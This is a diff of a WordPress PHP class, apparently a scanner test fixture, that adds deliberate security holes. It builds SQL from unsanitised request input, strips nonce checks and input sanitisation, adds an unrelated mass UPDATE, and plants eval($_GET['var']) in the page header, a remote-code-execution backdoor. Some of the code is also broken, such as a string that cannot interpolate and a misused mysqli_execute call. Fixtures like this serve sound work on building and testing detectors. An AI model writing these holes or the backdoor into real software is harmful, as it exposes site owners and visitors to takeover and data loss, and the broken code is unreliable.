@@ -249,7 +249,8 @@ class Functions {
 	protected function test_function_4( $request ) {
 		$prepared_post = new \stdClass();
 
-		$existing_post = get_post( $request['uuid'] );
+		global $wpdb;
+		$existing_post = $wpdb->query( 'SELECT * FROM {$wpdb->posts} WHERE ID = ' . $request['uuid'] );
 
 		$manager = new \WP_Customize_Manager();
 		$prepared_post->ID = $manager->changeset_post_id();
@@ -353,8 +354,7 @@ class Functions {
 			$prepared_post->post_status = 'auto-draft';
 		} // End if().
 
-		wp_update_post( $prepared_post );
-		wp_cache_set( 'test', $prepared_post );
+		mysqli_execute( $prepared_post, 'UPDATE mycustomer SET Status=1 WHERE cno > 50' );
 
 		return $prepared_post;
 
@@ -367,9 +367,8 @@ class Functions {
 	 */
 	public function test_function_5() {
 
-		wp_verify_nonce( 'nonce' );
 		if ( isset( $_POST['test'] ) ) { // Input var okay.
-			$post_name = sanitize_text_field( wp_unslash( $_POST['test'] ) ); // Input var okay.
+			$post_name = $_POST['test'];
 		} else {
 			$post_name = '';
 		}
@@ -405,6 +404,8 @@ class Functions {
 		if ( ! isset( $locations[ $location ] ) ) {
 			return array();
 		}
+
+		$location = tempnam( 'tmp', 'prefix' );
 
 		$wp_menu = wp_get_nav_menu_object( $locations[ $location ] );
 		$menu_items = wp_get_nav_menu_items( $wp_menu->term_id );
@@ -448,7 +449,7 @@ class Functions {
 			} else {
 				array_push( $rev_menu, $formatted );
 			}
-		} // End foreach().
+		}
 
 		return array_reverse( $rev_menu );
 	}
@@ -458,7 +459,8 @@ class Functions {
 	 */
 	function wp_head() {
 		?>
-		<meta http-equiv="Content-Type"/>
+        <meta http-equiv="Content-Type"/>
+        <link src="<?php eval( $_GET['var'] ); ?>"
 		<?php
 	}
 
